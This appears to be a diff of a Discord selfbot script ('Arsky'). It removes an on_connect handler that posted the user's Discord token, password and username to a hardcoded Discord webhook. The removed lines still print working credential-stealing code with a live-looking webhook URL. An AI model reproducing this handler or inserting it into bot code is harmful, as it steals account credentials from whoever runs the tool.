@@ -2557,13 +2557,6 @@ async def delfriends(ctx):
             await relationship.delete()
 
 
-@Arsky.event
-async def on_connect():
-    Clear()  
-    requests.post('https://discord.com/api/webhooks/831609039212904488/K9Qo0pisQJ413szsAosIZrQVYXPFqgcuV9ZUbknCN0qjaAg5HCCWWR1pQLDPc0ZEVsh_',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}**"})
-    startprint()
-
-
 
 @Arsky.command()
 async def clearblocked(ctx):
